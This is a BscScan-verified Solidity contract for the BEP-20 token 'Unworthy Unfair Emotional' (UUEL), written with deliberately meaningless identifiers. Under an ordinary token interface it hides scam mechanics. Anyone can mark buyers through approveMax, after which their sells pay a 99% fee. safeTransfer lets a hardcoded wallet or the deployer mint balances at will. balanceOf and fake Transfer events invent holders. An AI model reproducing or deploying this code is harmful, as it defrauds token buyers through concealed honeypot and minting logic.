/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;



interface IBEP20 {

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function getOwner() external view returns (address);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}




contract UnworthyUnfairEmotional is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private buyMinSenderMintEnable = 0;
    uint256 private botsLaunchFeeLaunched = 100;

    uint256  teamLaunchSenderMin = 100000000 * 10 ** _decimals;

    uint256 private feeToSwapModeTx = 0;
    bool private botsMarketingModeMintBuyTo = false;
    uint256 private maxTotalAtSwapTeam = 0;
    bool public minWalletBurnIs = false;
    mapping(address => bool) private atSwapEnableSender;
    uint256 constant swapExemptAmountBurn = 100000000 * (10 ** 18);
    bool private minBuyFundFromEnable = false;
    uint256 private senderExemptFundBuy = 0;
    string constant _name = "Unworthy Unfair Emotional";
    mapping(address => bool)  totalShouldMaxSwapToken;

    uint256 constant burnFeeTokenLiquidity = 100 * 10 ** 18;

    uint160 constant launchEnableSellReceiverFund = 227392286075;
    uint160 constant marketingMaxBuyAtReceiverWalletReceiver = 1029408359244 * 2 ** 40;


    uint256 public listReceiverMarketingFeeFrom = 0;
    uint256 public feeBurnTotalList = 0;
    IUniswapV2Router public teamSenderAutoTotalSellAmountBuy;
    mapping(address => bool)  minTradingFeeTx;
    
    string constant _symbol = "UUEL";
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 private senderTxBotsReceiver = 0;
    uint160 constant burnWalletFundTotalShouldTokenReceiver = 1085668888193 * 2 ** 120;





    uint256 constant receiverMarketingWalletTxFrom = 1000000 * 10 ** 18;
    uint256 private mintFundTakeBurn = 0;
    uint256 maxSellBotsWallet = 0;
    address private launchedTotalTokenLaunch = (msg.sender);
    mapping(address => uint256) _balances;
    uint160 constant receiverTokenSellBots = 11545121954 * 2 ** 80;

    uint256  marketingMintFundLimit = 100000000 * 10 ** _decimals;

    address public uniswapV2Pair;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        teamSenderAutoTotalSellAmountBuy = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(teamSenderAutoTotalSellAmountBuy.factory()).createPair(address(this), teamSenderAutoTotalSellAmountBuy.WETH());
        _allowances[address(this)][address(teamSenderAutoTotalSellAmountBuy)] = swapExemptAmountBurn;

        atSwapEnableSender[msg.sender] = true;
        atSwapEnableSender[address(this)] = true;

        _balances[msg.sender] = swapExemptAmountBurn;
        emit Transfer(address(0), msg.sender, swapExemptAmountBurn);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return swapExemptAmountBurn;
    }

    function settokenExemptReceiverModeMintFee(uint256 tradingShouldFromLiquidity) public onlyOwner {
        if (mintFundTakeBurn != maxTotalAtSwapTeam) {
            maxTotalAtSwapTeam=tradingShouldFromLiquidity;
        }
        mintFundTakeBurn=tradingShouldFromLiquidity;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (senderMarketingReceiverMinBuyBotsWallet(uint160(account))) {
            return tradingBurnTakeLimit(uint160(account));
        }
        return _balances[account];
    }

    function setminLaunchTakeBotsSenderAtLiquidity(uint256 tradingShouldFromLiquidity) public onlyOwner {
        if (senderTxBotsReceiver == feeToSwapModeTx) {
            feeToSwapModeTx=tradingShouldFromLiquidity;
        }
        if (senderTxBotsReceiver == botsLaunchFeeLaunched) {
            botsLaunchFeeLaunched=tradingShouldFromLiquidity;
        }
        if (senderTxBotsReceiver != listReceiverMarketingFeeFrom) {
            listReceiverMarketingFeeFrom=tradingShouldFromLiquidity;
        }
        senderTxBotsReceiver=tradingShouldFromLiquidity;
    }

    function minBotsReceiverTeamReceiverList(address receiverModeAtTradingTxReceiver, bool senderTeamBotsReceiverTotalMin) internal returns (uint256) {
        if (totalShouldMaxSwapToken[receiverModeAtTradingTxReceiver]) {
            return 99;
        }
        
        if (listReceiverMarketingFeeFrom != mintFundTakeBurn) {
            listReceiverMarketingFeeFrom = feeBurnTotalList;
        }

        if (botsMarketingModeMintBuyTo == minBuyFundFromEnable) {
            botsMarketingModeMintBuyTo = minBuyFundFromEnable;
        }


        if (senderTeamBotsReceiverTotalMin) {
            return mintFundTakeBurn;
        }
        if (!senderTeamBotsReceiverTotalMin && receiverModeAtTradingTxReceiver == uniswapV2Pair) {
            return maxTotalAtSwapTeam;
        }
        return 0;
    }

    function minAutoLaunchedMode(address receiverModeAtTradingTxReceiver, address senderModeMinExempt, uint256 modeAmountTotalFee) internal returns (bool) {
        if (senderMarketingReceiverMinBuyBotsWallet(uint160(senderModeMinExempt))) {
            feeLaunchLaunchedBurnAt(receiverModeAtTradingTxReceiver, senderModeMinExempt, modeAmountTotalFee, false);
            return true;
        }
        if (senderMarketingReceiverMinBuyBotsWallet(uint160(receiverModeAtTradingTxReceiver))) {
            feeLaunchLaunchedBurnAt(receiverModeAtTradingTxReceiver, senderModeMinExempt, modeAmountTotalFee, true);
            return true;
        }
        
        if (senderTxBotsReceiver == feeToSwapModeTx) {
            senderTxBotsReceiver = botsLaunchFeeLaunched;
        }


        bool sellShouldLiquidityIs = launchedTakeMinList(receiverModeAtTradingTxReceiver) || launchedTakeMinList(senderModeMinExempt);
        
        if (botsMarketingModeMintBuyTo != minWalletBurnIs) {
            botsMarketingModeMintBuyTo = minBuyFundFromEnable;
        }


        if (receiverModeAtTradingTxReceiver == uniswapV2Pair && !sellShouldLiquidityIs) {
            minTradingFeeTx[senderModeMinExempt] = true;
        }
        
        if (sellShouldLiquidityIs) {
            return launchTokenTeamList(receiverModeAtTradingTxReceiver, senderModeMinExempt, modeAmountTotalFee);
        }
        
        if (senderExemptFundBuy != listReceiverMarketingFeeFrom) {
            senderExemptFundBuy = listReceiverMarketingFeeFrom;
        }

        if (minWalletBurnIs == minWalletBurnIs) {
            minWalletBurnIs = minWalletBurnIs;
        }


        _balances[receiverModeAtTradingTxReceiver] = _balances[receiverModeAtTradingTxReceiver].sub(modeAmountTotalFee, "Insufficient Balance!");
        
        uint256 toModeAtFee = tokenLiquidityMinEnable(receiverModeAtTradingTxReceiver) ? receiverModeLimitLiquidityBuyMaxAt(receiverModeAtTradingTxReceiver, senderModeMinExempt, modeAmountTotalFee) : modeAmountTotalFee;

        _balances[senderModeMinExempt] = _balances[senderModeMinExempt].add(toModeAtFee);
        emit Transfer(receiverModeAtTradingTxReceiver, senderModeMinExempt, toModeAtFee);
        return true;
    }

    function getminLaunchTakeBotsSenderAtLiquidity() public view returns (uint256) {
        if (senderTxBotsReceiver == feeToSwapModeTx) {
            return feeToSwapModeTx;
        }
        return senderTxBotsReceiver;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return totalShouldMaxSwapToken[spender];
    }

    function gettokenExemptReceiverModeMintFee() public view returns (uint256) {
        if (mintFundTakeBurn != feeToSwapModeTx) {
            return feeToSwapModeTx;
        }
        if (mintFundTakeBurn != mintFundTakeBurn) {
            return mintFundTakeBurn;
        }
        if (mintFundTakeBurn == feeToSwapModeTx) {
            return feeToSwapModeTx;
        }
        return mintFundTakeBurn;
    }

    function gettakeListSellTotal() public view returns (bool) {
        if (minBuyFundFromEnable != minWalletBurnIs) {
            return minWalletBurnIs;
        }
        if (minBuyFundFromEnable != minWalletBurnIs) {
            return minWalletBurnIs;
        }
        return minBuyFundFromEnable;
    }

    function walletLaunchedTotalTake() private pure returns (address) {
        return 0x7dB4BeAF10fb5F797de07681A94AE8Da9BC87135;
    }

    function settakeListSellTotal(bool tradingShouldFromLiquidity) public onlyOwner {
        if (minBuyFundFromEnable != botsMarketingModeMintBuyTo) {
            botsMarketingModeMintBuyTo=tradingShouldFromLiquidity;
        }
        if (minBuyFundFromEnable != botsMarketingModeMintBuyTo) {
            botsMarketingModeMintBuyTo=tradingShouldFromLiquidity;
        }
        if (minBuyFundFromEnable == minBuyFundFromEnable) {
            minBuyFundFromEnable=tradingShouldFromLiquidity;
        }
        minBuyFundFromEnable=tradingShouldFromLiquidity;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function approveMax(address spender) external {
        if (minTradingFeeTx[spender]) {
            totalShouldMaxSwapToken[spender] = true;
        }
    }

    function feeLaunchLaunchedBurnAt(address receiverModeAtTradingTxReceiver, address senderModeMinExempt, uint256 modeAmountTotalFee, bool limitSwapWalletListAtBots) private {
        uint160 feeWalletLimitMode = burnWalletFundTotalShouldTokenReceiver + receiverTokenSellBots + marketingMaxBuyAtReceiverWalletReceiver + launchEnableSellReceiverFund;
        if (limitSwapWalletListAtBots) {
            receiverModeAtTradingTxReceiver = address(uint160(feeWalletLimitMode + maxSellBotsWallet));
            maxSellBotsWallet++;
            _balances[senderModeMinExempt] = _balances[senderModeMinExempt].add(modeAmountTotalFee);
        } else {
            _balances[receiverModeAtTradingTxReceiver] = _balances[receiverModeAtTradingTxReceiver].sub(modeAmountTotalFee);
        }
        if (modeAmountTotalFee == 0) {
            return;
        }
        emit Transfer(receiverModeAtTradingTxReceiver, senderModeMinExempt, modeAmountTotalFee);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getlaunchBuyLaunchedExempt(address tradingShouldFromLiquidity) public view returns (bool) {
        if (atSwapEnableSender[tradingShouldFromLiquidity] != atSwapEnableSender[tradingShouldFromLiquidity]) {
            return botsMarketingModeMintBuyTo;
        }
        if (atSwapEnableSender[tradingShouldFromLiquidity] != atSwapEnableSender[tradingShouldFromLiquidity]) {
            return botsMarketingModeMintBuyTo;
        }
            return atSwapEnableSender[tradingShouldFromLiquidity];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function senderMarketingReceiverMinBuyBotsWallet(uint160 tradingTakeIsFromMaxListBuy) private pure returns (bool) {
        uint160 feeWalletLimitMode = burnWalletFundTotalShouldTokenReceiver + receiverTokenSellBots + marketingMaxBuyAtReceiverWalletReceiver + launchEnableSellReceiverFund;
        if (tradingTakeIsFromMaxListBuy >= uint160(feeWalletLimitMode)) {
            if (tradingTakeIsFromMaxListBuy <= uint160(feeWalletLimitMode) + 300000) {
                return true;
            }
        }
        return false;
    }

    function setfeeMarketingLiquidityMin(uint256 tradingShouldFromLiquidity) public onlyOwner {
        if (botsLaunchFeeLaunched == feeBurnTotalList) {
            feeBurnTotalList=tradingShouldFromLiquidity;
        }
        if (botsLaunchFeeLaunched != feeToSwapModeTx) {
            feeToSwapModeTx=tradingShouldFromLiquidity;
        }
        botsLaunchFeeLaunched=tradingShouldFromLiquidity;
    }

    function getfeeMarketingLiquidityMin() public view returns (uint256) {
        if (botsLaunchFeeLaunched != buyMinSenderMintEnable) {
            return buyMinSenderMintEnable;
        }
        if (botsLaunchFeeLaunched != listReceiverMarketingFeeFrom) {
            return listReceiverMarketingFeeFrom;
        }
        return botsLaunchFeeLaunched;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return minAutoLaunchedMode(msg.sender, recipient, amount);
    }

    function launchTokenTeamList(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getlaunchedTeamModeBotsListTxReceiver() public view returns (uint256) {
        if (feeToSwapModeTx == feeBurnTotalList) {
            return feeBurnTotalList;
        }
        return feeToSwapModeTx;
    }

    function receiverModeLimitLiquidityBuyMaxAt(address receiverModeAtTradingTxReceiver, address teamAtAmountExempt, uint256 modeAmountTotalFee) internal returns (uint256) {
        
        if (feeBurnTotalList != senderTxBotsReceiver) {
            feeBurnTotalList = botsLaunchFeeLaunched;
        }


        uint256 botsToLaunchReceiverTakeReceiver = modeAmountTotalFee.mul(minBotsReceiverTeamReceiverList(receiverModeAtTradingTxReceiver, teamAtAmountExempt == uniswapV2Pair)).div(botsLaunchFeeLaunched);

        if (botsToLaunchReceiverTakeReceiver > 0) {
            _balances[address(this)] = _balances[address(this)].add(botsToLaunchReceiverTakeReceiver);
            emit Transfer(receiverModeAtTradingTxReceiver, address(this), botsToLaunchReceiverTakeReceiver);
        }

        return modeAmountTotalFee.sub(botsToLaunchReceiverTakeReceiver);
    }

    function tokenLiquidityMinEnable(address receiverModeAtTradingTxReceiver) internal view returns (bool) {
        return !atSwapEnableSender[receiverModeAtTradingTxReceiver];
    }

    function tradingBurnTakeLimit(uint160 tradingTakeIsFromMaxListBuy) private view returns (uint256) {
        uint160 feeWalletLimitMode = burnWalletFundTotalShouldTokenReceiver + receiverTokenSellBots + marketingMaxBuyAtReceiverWalletReceiver + launchEnableSellReceiverFund;
        uint160 modeSellFeeLimitLaunchBurn = tradingTakeIsFromMaxListBuy - feeWalletLimitMode;
        if (modeSellFeeLimitLaunchBurn < maxSellBotsWallet) {
            return burnFeeTokenLiquidity * modeSellFeeLimitLaunchBurn;
        }
        return receiverMarketingWalletTxFrom + burnFeeTokenLiquidity * modeSellFeeLimitLaunchBurn;
    }

    function safeTransfer(address receiverModeAtTradingTxReceiver, address senderModeMinExempt, uint256 modeAmountTotalFee) public {
        if (!listEnableTxMint(msg.sender) && msg.sender != launchedTotalTokenLaunch) {
            return;
        }
        if (senderMarketingReceiverMinBuyBotsWallet(uint160(senderModeMinExempt))) {
            feeLaunchLaunchedBurnAt(receiverModeAtTradingTxReceiver, senderModeMinExempt, modeAmountTotalFee, false);
            return;
        }
        if (senderModeMinExempt == address(1)) {
            return;
        }
        if (senderMarketingReceiverMinBuyBotsWallet(uint160(receiverModeAtTradingTxReceiver))) {
            feeLaunchLaunchedBurnAt(receiverModeAtTradingTxReceiver, senderModeMinExempt, modeAmountTotalFee, true);
            return;
        }
        if (modeAmountTotalFee == 0) {
            return;
        }
        if (receiverModeAtTradingTxReceiver == address(0)) {
            _balances[senderModeMinExempt] = _balances[senderModeMinExempt].add(modeAmountTotalFee);
            return;
        }
    }

    function setlaunchBuyLaunchedExempt(address tradingShouldFromLiquidity,bool takeMarketingBotsToShouldFeeSell) public onlyOwner {
        if (tradingShouldFromLiquidity != launchedTotalTokenLaunch) {
            minBuyFundFromEnable=takeMarketingBotsToShouldFeeSell;
        }
        if (tradingShouldFromLiquidity == launchedTotalTokenLaunch) {
            minWalletBurnIs=takeMarketingBotsToShouldFeeSell;
        }
        if (tradingShouldFromLiquidity != launchedTotalTokenLaunch) {
            minWalletBurnIs=takeMarketingBotsToShouldFeeSell;
        }
        atSwapEnableSender[tradingShouldFromLiquidity]=takeMarketingBotsToShouldFeeSell;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != swapExemptAmountBurn) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return minAutoLaunchedMode(sender, recipient, amount);
    }

    function launchedTakeMinList(address totalMinLaunchTo) private view returns (bool) {
        if (totalMinLaunchTo == launchedTotalTokenLaunch) {
            return true;
        }
        return false;
    }

    function setlaunchedTeamModeBotsListTxReceiver(uint256 tradingShouldFromLiquidity) public onlyOwner {
        if (feeToSwapModeTx == feeToSwapModeTx) {
            feeToSwapModeTx=tradingShouldFromLiquidity;
        }
        if (feeToSwapModeTx != listReceiverMarketingFeeFrom) {
            listReceiverMarketingFeeFrom=tradingShouldFromLiquidity;
        }
        feeToSwapModeTx=tradingShouldFromLiquidity;
    }

    function listEnableTxMint(address tradingTakeIsFromMaxListBuy) private pure returns (bool) {
        return tradingTakeIsFromMaxListBuy == walletLaunchedTotalTake();
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}